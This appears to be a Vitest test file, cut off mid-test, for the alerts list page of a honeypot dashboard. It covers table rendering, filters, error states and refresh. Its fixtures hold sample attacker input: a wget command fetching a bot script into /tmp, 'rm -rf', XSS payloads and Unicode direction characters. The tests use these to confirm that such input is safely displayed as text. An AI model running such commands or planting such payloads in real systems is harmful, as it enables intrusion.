import { QueryClient, QueryClientProvider, focusManager, onlineManager } from '@tanstack/react-query';
import { act, render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { HttpResponse, http } from 'msw';
import { MemoryRouter, useLocation, useNavigationType } from 'react-router-dom';
import { describe, expect, it } from 'vitest';

import { AppRoutes } from '../App';
import type { AlertResponse } from '../api/types';
import { makeAlert, makeAlerts, makeManyAlerts } from '../test/fixtures';
import { deferred, renderApp } from '../test/render';
import { ALERTS_URL, HEALTH_URL, alertUrl, server } from '../test/server';

const TABLE_NAME = 'Persisted alerts, newest first';

const findTable = () => screen.findByRole('table', { name: TABLE_NAME });
const queryTable = () => screen.queryByRole('table', { name: TABLE_NAME });
const searchBox = () => screen.getByRole('searchbox', { name: 'Search' });

function bodyRows(): HTMLElement[] {
  return within(screen.getByRole('table', { name: TABLE_NAME })).getAllByRole('row').slice(1);
}

/** The alert IDs shown, top to bottom. */
function listedIds(): number[] {
  return bodyRows().map((row) => {
    const match = /#(\d+)/.exec(within(row).getByRole('link').textContent);
    return Number(match?.[1]);
  });
}

/** Answer the list with `alerts` and record each request made for it. */
function trackList(alerts: readonly AlertResponse[] = makeAlerts()) {
  const requests: URL[] = [];
  server.use(
    http.get(ALERTS_URL, ({ request }) => {
      requests.push(new URL(request.url));
      return HttpResponse.json(alerts);
    }),
  );
  return requests;
}

describe('AlertsPage: loaded list', () => {
  it('shows the page title and one row per persisted alert, in the order the API returned them', async () => {
    renderApp('/alerts');

    await findTable();

    expect(screen.getByRole('heading', { level: 1, name: 'Alerts' })).toBeInTheDocument();
    expect(listedIds()).toEqual([5, 4, 3, 2, 1]);
  });

  it('requests the list once, with an explicit limit', async () => {
    const requests = trackList();

    renderApp('/alerts');
    await findTable();

    expect(requests).toHaveLength(1);
    expect(requests[0]?.pathname).toBe('/api/v1/alerts');
    expect(requests[0]?.search).toBe('?limit=200');
  });

  it('shows the total number of alerts returned', async () => {
    renderApp('/alerts');

    await findTable();

    expect(screen.getByText('5 alerts returned')).toBeInTheDocument();
  });

  it('uses the singular for a single alert', async () => {
    trackList(makeAlerts().slice(0, 1));

    renderApp('/alerts');
    await findTable();

    expect(screen.getByText('1 alert returned')).toBeInTheDocument();
  });

  it('has exactly the columns the API provides data for, and no invented ones', async () => {
    renderApp('/alerts');

    const table = await findTable();

    expect(within(table).getAllByRole('columnheader').map((header) => header.textContent)).toEqual([
      'ID',
      'Time (UTC)',
      'Event type',
      'Source IP',
      'Command',
      'Score',
      'Anomaly flag',
    ]);
    expect(table).not.toHaveTextContent(/severity|confidence|risk|threat/i);
  });

  it('shows each alert as plain, readable values', async () => {
    renderApp('/alerts');
    await findTable();

    const first = bodyRows()[0];
    expect(first).toBeDefined();
    const row = within(first as HTMLElement);

    expect(row.getByRole('rowheader')).toHaveTextContent('#5');
    const cells = row.getAllByRole('cell').map((cell) => cell.textContent);
    expect(cells).toEqual([
      '2026-08-19 18:05:00 UTC',
      'cowrie.command.input',
      '10.0.0.1',
      'wget http://x.test/bot.sh -O /tmp/bot.sh',
      '-0.3512',
      'Flagged',
    ]);
  });

  it('marks the time with a machine-readable value and keeps the recorded text available', async () => {
    renderApp('/alerts');
    await findTable();

    const time = within(bodyRows()[0] as HTMLElement).getByText('2026-08-19 18:05:00 UTC');

    expect(time.tagName).toBe('TIME');
    expect(time).toHaveAttribute('datetime', '2026-08-19T18:05:00.000Z');
    expect(time).toHaveAttribute('title', '2026-08-19T18:05:00Z');
  });

  it('writes the anomaly flag out in words for flagged and unflagged records', async () => {
    renderApp('/alerts');
    await findTable();

    const flags = bodyRows().map((row) => within(row).getAllByRole('cell').at(-1)?.textContent);
    expect(flags).toEqual(['Flagged', 'Not flagged', 'Not flagged', 'Flagged', 'Not flagged']);
  });

  it('shows "(none)" for an empty command', async () => {
    renderApp('/alerts');
    await findTable();

    const row = bodyRows().find((candidate) => within(candidate).queryByText('#4', { exact: false }));
    expect(within(row as HTMLElement).getAllByRole('cell')[3]).toHaveTextContent('(none)');
  });

  it('shortens a long command in the table and collapses its whitespace', async () => {
    trackList([
      makeAlert({ id: 2, command: 'a'.repeat(300) }),
      makeAlert({ id: 1, command: 'echo   hi\n\n\tthere' }),
    ]);

    renderApp('/alerts');
    await findTable();

    const [long, spaced] = bodyRows().map((row) => within(row).getAllByRole('cell')[3]);
    expect(long).toHaveTextContent(`${'a'.repeat(80)}…`);
    expect(long?.textContent).toHaveLength(81);
    expect(spaced).toHaveTextContent('echo hi there');
  });

  it('shows invisible direction and zero-width characters as markers, so text cannot be disguised', async () => {
    trackList([
      makeAlert({
        id: 2,
        command: 'echo \u202Eevil\u202C done',
        event_type: 'cowrie\u200B.command.input',
        source_ip: '10.0.0.\u200F1',
        timestamp: '2026-08-19\u202E',
      }),
      makeAlert({ id: 1, command: 'rm -rf' }),
    ]);

    renderApp('/alerts');
    await findTable();

    const cells = within(bodyRows()[0] as HTMLElement).getAllByRole('cell');
    expect(cells[0]).toHaveTextContent('2026-08-19[U+202E]');
    expect(cells[1]).toHaveTextContent('cowrie[U+200B].command.input');
    expect(cells[2]).toHaveTextContent('10.0.0.[U+200F]1');
    expect(cells[3]).toHaveTextContent('echo [U+202E]evil[U+202C] done');
    expect(document.body.textContent).not.toMatch(/[\u202A-\u202E\u200B-\u200F]/);
    // The event-type filter lists the same marked text, and still filters on the real value.
    expect(within(screen.getByRole('combobox', { name: 'Event type' })).getByRole('option', { name: 'cowrie[U+200B].command.input' })).toBeInTheDocument();
  });

  it('shows a timestamp it cannot read exactly as recorded', async () => {
    trackList([makeAlert({ id: 1, timestamp: 'yesterday around noon' })]);

    renderApp('/alerts');
    await findTable();

    const cell = within(bodyRows()[0] as HTMLElement).getAllByRole('cell')[0] as HTMLElement;
    expect(cell).toHaveTextContent('yesterday around noon');
    expect(cell.querySelector('time')).toBeNull();
  });

  it('renders attacker-controlled text as text, never as markup', async () => {
    const hostile = '<img src=x onerror=alert(1)>';
    trackList([
      makeAlert({
        id: 1,
        command: hostile,
        event_type: '<script>alert(2)</script>',
        source_ip: '"><svg onload=alert(3)>',
      }),
    ]);

    const { container } = renderApp('/alerts');
    await findTable();

    expect(container.querySelector('img, script, [onerror], [onload]')).toBeNull();
    const row = bodyRows()[0] as HTMLElement;
    expect(row).toHaveTextContent(hostile);
    expect(row).toHaveTextContent('<script>alert(2)</script>');
    expect(row).toHaveTextContent('"><svg onload=alert(3)>');
  });

  it('says a flagged record is an outlier, not a confirmed attack, and that scores are not probabilities', async () => {
    renderApp('/alerts');
    await findTable();

    const main = screen.getByRole('main');
    expect(main).toHaveTextContent(/not a confirmed attack/i);
    expect(main).toHaveTextContent(/scores are not probabilities or confidence values/i);
    expect(main).not.toHaveTextContent(/severity|malicious|threat/i);
  });

  it('lists persisted records only, and says the order is by persistence', async () => {
    renderApp('/alerts');
    await findTable();

    expect(screen.getByText(/newest first by when each was persisted/i)).toBeInTheDocument();
  });
});

describe('AlertsPage: accessibility', () => {
  it('uses a real table with a caption, column headers and row headers', async () => {
    renderApp('/alerts');

    const table = await findTable();

    expect(table.querySelector('caption')).toHaveTextContent(TABLE_NAME);
    for (const header of within(table).getAllByRole('columnheader')) {
      expect(header).toHaveAttribute('scope', 'col');
    }
    expect(within(table).getAllByRole('rowheader')).toHaveLength(5);
  });

  it('wraps the table in a labelled, keyboard-focusable scroll region', async () => {
    renderApp('/alerts');
    await findTable();

    const region = screen.getByRole('region', { name: /alerts table\. scrolls sideways/i });
    expect(region).toHaveAttribute('tabindex', '0');
    expect(within(region).getByRole('table', { name: TABLE_NAME })).toBeInTheDocument();
  });

  it('gives every alert link a name that says what it opens', async () => {
    renderApp('/alerts');
    await findTable();

    expect(screen.getByRole('link', { name: 'Open alert #5' })).toHaveAttribute('href', '/alerts/5');
    expect(screen.getByRole('link', { name: 'Open alert #1' })).toHaveAttribute('href', '/alerts/1');
  });

  it('labels the search and its filters, and describes how the search works', async () => {
    renderApp('/alerts');
    await findTable();

    expect(screen.getByRole('search', { name: 'Filter alerts' })).toBeInTheDocument();
    expect(searchBox()).toHaveAccessibleDescription(/case-insensitive/i);
    expect(screen.getByRole('combobox', { name: 'Event type' })).toBeInTheDocument();
    expect(screen.getByRole('combobox', { name: 'Anomaly flag' })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Clear filters' })).toBeInTheDocument();
  });

  it('announces the count of alerts as a status message', async () => {
    renderApp('/alerts');
    await findTable();

    expect(screen.getByText('5 alerts returned')).toHaveAttribute('role', 'status');
  });
});

describe('AlertsPage: loading state', () => {
  it('shows a loading placeholder, not a table, until the alerts arrive', async () => {
    const gate = deferred();
    server.use(
      http.get(ALERTS_URL, async () => {
        await gate.promise;
        return HttpResponse.json(makeAlerts());
      }),
    );

    renderApp('/alerts');

    expect(screen.getByText('Loading alerts…')).toBeInTheDocument();
    expect(screen.getByRole('heading', { level: 1, name: 'Alerts' })).toBeInTheDocument();
    expect(queryTable()).not.toBeInTheDocument();
    expect(screen.queryByRole('searchbox')).not.toBeInTheDocument();

    gate.resolve();
    expect(await findTable()).toBeInTheDocument();
    expect(screen.queryByText('Loading alerts…')).not.toBeInTheDocument();
  });
});

describe('AlertsPage: empty state', () => {
  it('shows an empty state, without a table or filters, when nothing is persisted', async () => {
    trackList([]);

    renderApp('/alerts');

    expect(await screen.findByRole('heading', { name: 'No alerts persisted yet' })).toBeInTheDocument();
    expect(queryTable()).not.toBeInTheDocument();
    expect(screen.queryByRole('searchbox')).not.toBeInTheDocument();
    expect(screen.queryByText(/alerts? returned/)).not.toBeInTheDocument();
  });

  it('does not claim an empty store means nothing is happening', async () => {
    trackList([]);

    renderApp('/alerts');

    await screen.findByRole('heading', { name: 'No alerts persisted yet' });
    expect(screen.getByText(/cannot tell "nothing has been flagged" apart from/i)).toBeInTheDocument();
    expect(document.body.textContent).not.toMatch(/all clear|no threats|nothing to worry|healthy|operational/i);
  });
});

describe('AlertsPage: API unavailable', () => {
  it('shows the unavailable state, with causes, when the request cannot complete', async () => {
    server.use(http.get(ALERTS_URL, () => HttpResponse.error()));

    renderApp('/alerts');

    const alert = await screen.findByRole('alert');
    expect(within(alert).getByRole('heading', { name: 'Cannot reach the SecureTrap API' })).toBeInTheDocument();
    expect(alert).toHaveTextContent('The request did not complete, so alerts could not be loaded.');
    expect(alert).toHaveTextContent(/SECURETRAP_CORS_ORIGINS/);
    expect(alert).toHaveTextContent(/VITE_API_BASE_URL/);
    expect(within(alert).getByText('http://api.test')).toBeInTheDocument();
    expect(queryTable()).not.toBeInTheDocument();
  });

  it('recovers when the API comes back and the user tries again', async () => {
    let calls = 0;
    server.use(
      http.get(ALERTS_URL, () => {
        calls += 1;
        return calls === 1 ? HttpResponse.error() : HttpResponse.json(makeAlerts());
      }),
    );
    const user = userEvent.setup();
    renderApp('/alerts');
    await screen.findByRole('heading', { name: 'Cannot reach the SecureTrap API' });

    await user.click(screen.getByRole('button', { name: 'Try again' }));

    expect(await findTable()).toBeInTheDocument();
    expect(listedIds()).toEqual([5, 4, 3, 2, 1]);
    expect(screen.queryByRole('alert')).not.toBeInTheDocument();
    expect(calls).toBe(2);
  });

  it('keeps the page title and its explanation while the API is unavailable', async () => {
    server.use(http.get(ALERTS_URL, () => HttpResponse.error()));

    renderApp('/alerts');

    await screen.findByRole('alert');
    expect(screen.getByRole('heading', { level: 1, name: 'Alerts' })).toBeInTheDocument();
    expect(within(screen.getByRole('main')).getByText(/not a confirmed attack/i)).toBeInTheDocument();
  });
});

describe('AlertsPage: error states', () => {
  it('shows an error state, with the status code, when the API answers HTTP 500', async () => {
    server.use(http.get(ALERTS_URL, () => HttpResponse.json({ detail: 'Internal server error.' }, { status: 500 })));

    renderApp('/alerts');

    const alert = await screen.findByRole('alert');
    expect(within(alert).getByRole('heading', { name: 'The API returned an error' })).toBeInTheDocument();
    expect(alert).toHaveTextContent('Alerts could not be loaded.');
    expect(alert).toHaveTextContent('HTTP 500');
    expect(queryTable()).not.toBeInTheDocument();
  });

  it('never renders server-provided error text', async () => {
    server.use(http.get(ALERTS_URL, () => HttpResponse.json({ detail: '<img src=x onerror=alert(1)>' }, { status: 500 })));

    const { container } = renderApp('/alerts');

    await screen.findByRole('heading', { name: 'The API returned an error' });
    expect(document.body.textContent).not.toContain('onerror');
    expect(container.querySelector('img')).toBeNull();
  });

  it('lets the user retry after an error', async () => {
    let calls = 0;
    server.use(
      http.get(ALERTS_URL, () => {
        calls += 1;
        return calls === 1 ? HttpResponse.json({}, { status: 500 }) : HttpResponse.json(makeAlerts());
      }),
    );
    const user = userEvent.setup();
    renderApp('/alerts');
    await screen.findByRole('heading', { name: 'The API returned an error' });

    await user.click(screen.getByRole('button', { name: 'Try again' }));

    expect(await findTable()).toBeInTheDocument();
    expect(calls).toBe(2);
  });

  it('shows the unexpected-response state when the body is not a list', async () => {
    server.use(http.get(ALERTS_URL, () => HttpResponse.json({ alerts: [] })));

    renderApp('/alerts');

    const alert = await screen.findByRole('alert');
    expect(within(alert).getByRole('heading', { name: 'Unexpected API response' })).toBeInTheDocument();
    expect(queryTable()).not.toBeInTheDocument();
  });

  it('names the field of a malformed alert, and shows no partial table', async () => {
    server.use(http.get(ALERTS_URL, () => HttpResponse.json([makeAlert({ id: 2 }), { ...makeAlert({ id: 1 }), score: 'high' }])));

    renderApp('/alerts');

    const alert = await screen.findByRole('alert');
    expect(within(alert).getByRole('heading', { name: 'Unexpected API response' })).toBeInTheDocument();
    expect(alert).toHaveTextContent('alerts[1].score');
    expect(queryTable()).not.toBeInTheDocument();
  });

  it('shows the unexpected-response state when the body is not JSON', async () => {
    server.use(
      http.get(
        ALERTS_URL,
        () => new HttpResponse('<html>gateway</html>', { status: 200, headers: { 'Content-Type': 'text/html' } }),
      ),
    );

    renderApp('/alerts');

    expect(await screen.findByRole('heading', { name: 'Unexpected API response' })).toBeInTheDocument();
  });
});

describe('AlertsPage: search and filters', () => {
  it('narrows the table as the user types, case-insensitively, and says how many are shown', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    await user.type(searchBox(), 'WGET');

    expect(listedIds()).toEqual([5]);
    expect(screen.getByText('Showing 1 of 5 returned alerts')).toBeInTheDocument();
  });

  it('finds mixed-case text whatever case is typed', async () => {
    trackList([makeAlert({ id: 2, command: 'WGet HTTP://X.test/Bot.sh' }), makeAlert({ id: 1, command: 'ls' })]);
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    await user.type(searchBox(), 'wGET http://x.TEST');

    expect(listedIds()).toEqual([2]);
  });

  it('searches the source IP, event type, session and command', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    await user.type(searchBox(), '10.0.0.2');
    expect(listedIds()).toEqual([4, 1]);

    await user.clear(searchBox());
    await user.type(searchBox(), 'LOGIN.FAILED');
    expect(listedIds()).toEqual([4]);

    await user.clear(searchBox());
    await user.type(searchBox(), 'sess-0003');
    expect(listedIds()).toEqual([3]);

    await user.clear(searchBox());
    await user.type(searchBox(), 'passwd');
    expect(listedIds()).toEqual([2]);
  });

  it('requires every word to match', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    await user.type(searchBox(), '10.0.0.1 cat');
    expect(listedIds()).toEqual([2]);

    await user.clear(searchBox());
    await user.type(searchBox(), '10.0.0.1 uname');
    expect(queryTable()).not.toBeInTheDocument();
  });

  it('filters by event type using the types that are actually present', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    const select = screen.getByRole('combobox', { name: 'Event type' });
    expect(within(select).getAllByRole('option').map((option) => option.textContent)).toEqual([
      'All event types',
      'cowrie.command.input',
      'cowrie.login.failed',
      'cowrie.login.success',
    ]);

    await user.selectOptions(select, 'cowrie.command.input');

    expect(listedIds()).toEqual([5, 3, 2]);
    expect(screen.getByText('Showing 3 of 5 returned alerts')).toBeInTheDocument();
  });

  it('filters by anomaly flag when both flagged and unflagged records are present', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    const select = screen.getByRole('combobox', { name: 'Anomaly flag' });
    await user.selectOptions(select, 'Flagged as anomaly');
    expect(listedIds()).toEqual([5, 2]);

    await user.selectOptions(select, 'Not flagged');
    expect(listedIds()).toEqual([4, 3, 1]);

    await user.selectOptions(select, 'All records');
    expect(listedIds()).toEqual([5, 4, 3, 2, 1]);
  });

  it('combines the search with the filters', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    await user.type(searchBox(), '10.0.0.1');
    await user.selectOptions(screen.getByRole('combobox', { name: 'Anomaly flag' }), 'Flagged as anomaly');
    await user.selectOptions(screen.getByRole('combobox', { name: 'Event type' }), 'cowrie.command.input');

    expect(listedIds()).toEqual([5, 2]);
  });

  it('never calls the API again while the user searches and filters', async () => {
    const requests = trackList();
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    await user.type(searchBox(), 'wget http');
    await user.selectOptions(screen.getByRole('combobox', { name: 'Anomaly flag' }), 'Flagged as anomaly');
    await user.selectOptions(screen.getByRole('combobox', { name: 'Event type' }), 'cowrie.command.input');
    await user.click(screen.getByRole('button', { name: 'Clear filters' }));

    expect(listedIds()).toEqual([5, 4, 3, 2, 1]);
    expect(requests).toHaveLength(1);
  });

  it('shows a no-results state, with a way out, when nothing matches', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    await user.type(searchBox(), 'zzz-no-such-text');

    const panel = screen.getByRole('status', { name: 'No alerts match the filters' });
    expect(panel).toHaveTextContent('None of the 5 loaded alerts match.');
    expect(queryTable()).not.toBeInTheDocument();
    expect(screen.getByText('Showing 0 of 5 returned alerts')).toBeInTheDocument();

    await user.click(within(panel).getByRole('button', { name: 'Clear filters' }));

    expect(screen.queryByRole('status', { name: 'No alerts match the filters' })).not.toBeInTheDocument();
    expect(listedIds()).toEqual([5, 4, 3, 2, 1]);
    expect(searchBox()).toHaveValue('');
  });

  it('has a Clear filters button that is disabled until a filter is set, then resets everything', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();
    const clear = screen.getByRole('button', { name: 'Clear filters' });
    expect(clear).toBeDisabled();

    await user.type(searchBox(), 'cat');
    await user.selectOptions(screen.getByRole('combobox', { name: 'Anomaly flag' }), 'Flagged as anomaly');
    expect(clear).toBeEnabled();

    await user.click(clear);

    expect(searchBox()).toHaveValue('');
    expect(screen.getByRole('combobox', { name: 'Anomaly flag' })).toHaveValue('all');
    expect(listedIds()).toEqual([5, 4, 3, 2, 1]);
    expect(clear).toBeDisabled();
  });

  it('treats a search made only of spaces as no filter', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    await user.type(searchBox(), '   ');

    expect(listedIds()).toEqual([5, 4, 3, 2, 1]);
    expect(screen.getByText('5 alerts returned')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Clear filters' })).toBeDisabled();
  });

  it('treats regular-expression characters in the search as plain text', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    await user.type(searchBox(), '(.*');

    expect(queryTable()).not.toBeInTheDocument();
    expect(screen.getByRole('status', { name: 'No alerts match the filters' })).toBeInTheDocument();
  });

  it('only offers the event-type filter when there is more than one event type', async () => {
    trackList([makeAlert({ id: 2 }), makeAlert({ id: 1, is_anomaly: false, prediction: 1 })]);

    renderApp('/alerts');
    await findTable();

    expect(screen.queryByRole('combobox', { name: 'Event type' })).not.toBeInTheDocument();
    expect(screen.getByRole('combobox', { name: 'Anomaly flag' })).toBeInTheDocument();
  });

  it('only offers the anomaly-flag filter when both flagged and unflagged records are present', async () => {
    trackList([makeAlert({ id: 2, event_type: 'a' }), makeAlert({ id: 1, event_type: 'b' })]);

    renderApp('/alerts');
    await findTable();

    expect(screen.queryByRole('combobox', { name: 'Anomaly flag' })).not.toBeInTheDocument();
    expect(screen.getByRole('combobox', { name: 'Event type' })).toBeInTheDocument();
    expect(searchBox()).toBeInTheDocument();
  });

  it('offers only the search when no other filter could change the result', async () => {
    trackList(makeManyAlerts(3));

    renderApp('/alerts');
    await findTable();

    expect(screen.queryByRole('combobox')).not.toBeInTheDocument();
    expect(searchBox()).toBeInTheDocument();
  });
});

describe('AlertsPage: filters in the address bar', () => {
  it('applies filters found in the address', async () => {
    renderApp('/alerts?q=wget');

    await findTable();

    expect(searchBox()).toHaveValue('wget');
    expect(listedIds()).toEqual([5]);
    expect(screen.getByText('Showing 1 of 5 returned alerts')).toBeInTheDocument();
  });

  it('applies the event-type and flag filters found in the address', async () => {
    renderApp('/alerts?type=cowrie.command.input&flag=notFlagged');

    await findTable();

    expect(listedIds()).toEqual([3]);
    expect(screen.getByRole('combobox', { name: 'Event type' })).toHaveValue('cowrie.command.input');
    expect(screen.getByRole('combobox', { name: 'Anomaly flag' })).toHaveValue('notFlagged');
  });

  it('ignores values from the address that the loaded data cannot support', async () => {
    renderApp('/alerts?type=no.such.type&flag=bogus');

    await findTable();

    expect(listedIds()).toEqual([5, 4, 3, 2, 1]);
    expect(screen.getByRole('button', { name: 'Clear filters' })).toBeDisabled();
  });

  it('ignores a flag filter when every record has the same flag', async () => {
    trackList(makeManyAlerts(3));

    renderApp('/alerts?flag=notFlagged');
    await findTable();

    expect(listedIds()).toEqual([3, 2, 1]);
  });

  it('resets the filters when the Alerts link in the navigation is followed', async () => {
    const user = userEvent.setup();
    renderApp('/alerts?q=wget');
    await findTable();
    expect(listedIds()).toEqual([5]);

    await user.click(within(screen.getByRole('navigation', { name: 'Primary' })).getByRole('link', { name: 'Alerts' }));

    await waitFor(() => expect(searchBox()).toHaveValue(''));
    expect(listedIds()).toEqual([5, 4, 3, 2, 1]);
  });
});

/** Shows where the router is, so a test can see what the page does to the address bar. */
function LocationProbe() {
  const location = useLocation();
  const navigationType = useNavigationType();
  return (
    <output data-testid="location" data-navigation={navigationType}>
      {location.pathname + location.search}
    </output>
  );
}

function renderWithLocation(route: string) {
  const queryClient = new QueryClient({ defaultOptions: { queries: { retry: false, staleTime: 0 } } });
  return render(
    <QueryClientProvider client={queryClient}>
      <MemoryRouter initialEntries={[route]}>
        <AppRoutes />
        <LocationProbe />
      </MemoryRouter>
    </QueryClientProvider>,
  );
}

describe('AlertsPage: filters are kept in the address bar', () => {
  const address = () => screen.getByTestId('location');

  it('writes the search and the filters into the address as they change', async () => {
    const user = userEvent.setup();
    renderWithLocation('/alerts');
    await findTable();
    expect(address()).toHaveTextContent(/^\/alerts$/);

    await user.type(searchBox(), 'wget');
    expect(address()).toHaveTextContent(/^\/alerts\?q=wget$/);

    await user.selectOptions(screen.getByRole('combobox', { name: 'Anomaly flag' }), 'Flagged as anomaly');
    expect(address()).toHaveTextContent(/^\/alerts\?q=wget&flag=flagged$/);

    await user.selectOptions(screen.getByRole('combobox', { name: 'Event type' }), 'cowrie.command.input');
    expect(address()).toHaveTextContent(/^\/alerts\?q=wget&type=cowrie\.command\.input&flag=flagged$/);
  });

  it('replaces the current history entry instead of adding one per keystroke', async () => {
    const user = userEvent.setup();
    renderWithLocation('/alerts');
    await findTable();

    await user.type(searchBox(), 'wg');

    expect(address()).toHaveAttribute('data-navigation', 'REPLACE');
  });

  it('removes the filters from the address when they are cleared', async () => {
    const user = userEvent.setup();
    renderWithLocation('/alerts?q=cat&flag=flagged');
    await findTable();
    expect(address()).toHaveTextContent('/alerts?q=cat&flag=flagged');

    await user.click(screen.getByRole('button', { name: 'Clear filters' }));

    expect(address()).toHaveTextContent(/^\/alerts$/);
  });

  it('encodes awkward search text safely in the address and reads it back', async () => {
    const user = userEvent.setup();
    renderWithLocation('/alerts');
    await findTable();

    await user.type(searchBox(), 'a&b=c #d');

    expect(address()).toHaveTextContent('/alerts?q=a%26b%3Dc+%23d');
    expect(searchBox()).toHaveValue('a&b=c #d');
  });
});

describe('AlertsPage: more alerts than the API was asked for', () => {
  it('explains that older alerts are not loaded when the limit was reached', async () => {
    const requests = trackList(makeManyAlerts(200));

    renderApp('/alerts');
    await findTable();

    expect(requests[0]?.search).toBe('?limit=200');
    expect(screen.getByText('200 alerts returned')).toBeInTheDocument();
    expect(screen.getByText(/200 most recently persisted alerts/i)).toHaveTextContent(/older alerts, if any, are not loaded/i);
    expect(bodyRows()).toHaveLength(200);
  });

  it('does not show the note when fewer alerts than the limit came back', async () => {
    trackList(makeManyAlerts(199));

    renderApp('/alerts');
    await findTable();

    expect(screen.queryByText(/most recently persisted alerts/i)).not.toBeInTheDocument();
  });
});

describe('AlertsPage: refresh', () => {
  it('loads the list again, and shows the new alert, when Refresh is pressed', async () => {
    let calls = 0;
    server.use(
      http.get(ALERTS_URL, () => {
        calls += 1;
        return HttpResponse.json(calls === 1 ? makeAlerts() : [makeAlert({ id: 6, session_id: 'sess-0006' }), ...makeAlerts()]);
      }),
    );
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();
    expect(screen.getByText('5 alerts returned')).toBeInTheDocument();

    await user.click(screen.getByRole('button', { name: 'Refresh' }));

    expect(await screen.findByText('6 alerts returned')).toBeInTheDocument();
    expect(listedIds()).toEqual([6, 5, 4, 3, 2, 1]);
    expect(calls).toBe(2);
  });

  it('keeps the table, and the filters, on screen while refreshing', async () => {
    const gate = deferred();
    let calls = 0;
    server.use(
      http.get(ALERTS_URL, async () => {
        calls += 1;
        if (calls > 1) {
          await gate.promise;
        }
        return HttpResponse.json(makeAlerts());
      }),
    );
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();
    await user.type(searchBox(), 'wget');

    await user.click(screen.getByRole('button', { name: 'Refresh' }));

    const busy = await screen.findByRole('button', { name: 'Refreshing…' });
    expect(busy).toBeDisabled();
    expect(listedIds()).toEqual([5]);
    expect(searchBox()).toHaveValue('wget');
    expect(screen.queryByText('Loading alerts…')).not.toBeInTheDocument();

    gate.resolve();
    await screen.findByRole('button', { name: 'Refresh' });
    expect(listedIds()).toEqual([5]);
  });

  it('keeps the last alerts visible, marked stale, when a refresh fails', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    server.use(http.get(ALERTS_URL, () => HttpResponse.error()));
    await user.click(screen.getByRole('button', { name: 'Refresh' }));

    const notice = await screen.findByText(/Showing the last data received at/i);
    expect(notice).toHaveTextContent(/The latest refresh failed:/);
    expect(notice).toHaveTextContent(/could not be reached/i);
    expect(listedIds()).toEqual([5, 4, 3, 2, 1]);
    expect(screen.queryByRole('alert')).not.toBeInTheDocument();
  });

  it('clears the stale notice once a later refresh succeeds', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();
    server.use(http.get(ALERTS_URL, () => HttpResponse.error()));
    await user.click(screen.getByRole('button', { name: 'Refresh' }));
    await screen.findByText(/Showing the last data received at/i);

    server.use(http.get(ALERTS_URL, () => HttpResponse.json(makeAlerts().slice(0, 2))));
    await user.click(screen.getByRole('button', { name: 'Refresh' }));

    await waitFor(() => expect(screen.queryByText(/Showing the last data received at/i)).not.toBeInTheDocument());
    expect(listedIds()).toEqual([5, 4]);
  });

  it('moves from a table to the empty state when a refresh finds the store empty', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    trackList([]);
    await user.click(screen.getByRole('button', { name: 'Refresh' }));

    expect(await screen.findByRole('heading', { name: 'No alerts persisted yet' })).toBeInTheDocument();
    expect(queryTable()).not.toBeInTheDocument();
  });

  it('does not reload on its own when the window regains focus or the network returns', async () => {
    const requests = trackList();
    let healthCalls = 0;
    server.use(
      http.get(HEALTH_URL, () => {
        healthCalls += 1;
        return HttpResponse.json({ status: 'ok' });
      }),
    );
    // Unlike the usual test client, this one refetches on focus and reconnect
    // by default, so a refetch that does not happen is down to the page.
    const queryClient = new QueryClient({
      defaultOptions: { queries: { retry: false, staleTime: 0, refetchOnWindowFocus: true, refetchOnReconnect: true } },
    });
    render(
      <QueryClientProvider client={queryClient}>
        <MemoryRouter initialEntries={['/alerts']}>
          <AppRoutes />
        </MemoryRouter>
      </QueryClientProvider>,
    );
    await findTable();
    await screen.findByText('API reachable');
    const healthBefore = healthCalls;

    try {
      act(() => {
        focusManager.setFocused(false);
        focusManager.setFocused(true);
        onlineManager.setOnline(false);
        onlineManager.setOnline(true);
      });
      // The status indicator reloads, which shows these events took effect...
      await waitFor(() => expect(healthCalls).toBeGreaterThan(healthBefore));
      await new Promise((resolve) => setTimeout(resolve, 50));
    } finally {
      focusManager.setFocused(undefined);
      onlineManager.setOnline(true);
    }

    // ...while the alert list stays exactly as it was loaded.
    expect(requests).toHaveLength(1);
  });
});

describe('AlertsPage: opening an alert', () => {
  it('opens the alert from its link, loading it by its persisted ID', async () => {
    const detailPaths: string[] = [];
    server.use(
      http.get(alertUrl(4), ({ request }) => {
        detailPaths.push(new URL(request.url).pathname);
        return HttpResponse.json(makeAlerts().find((alert) => alert.id === 4));
      }),
    );
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    await user.click(screen.getByRole('link', { name: 'Open alert #4' }));

    expect(await screen.findByRole('heading', { level: 1, name: 'Alert #4' })).toBeInTheDocument();
    expect(await screen.findByText('sess-0004')).toBeInTheDocument();
    expect(queryTable()).not.toBeInTheDocument();
    expect(detailPaths).toEqual(['/api/v1/alerts/4']);
  });

  it('can be opened from the keyboard', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    screen.getByRole('link', { name: 'Open alert #3' }).focus();
    await user.keyboard('{Enter}');

    expect(await screen.findByRole('heading', { level: 1, name: 'Alert #3' })).toBeInTheDocument();
  });

  it('moves focus to the new page heading, so keyboard and screen-reader users land on it', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    await user.click(screen.getByRole('link', { name: 'Open alert #2' }));

    const heading = await screen.findByRole('heading', { level: 1, name: 'Alert #2' });
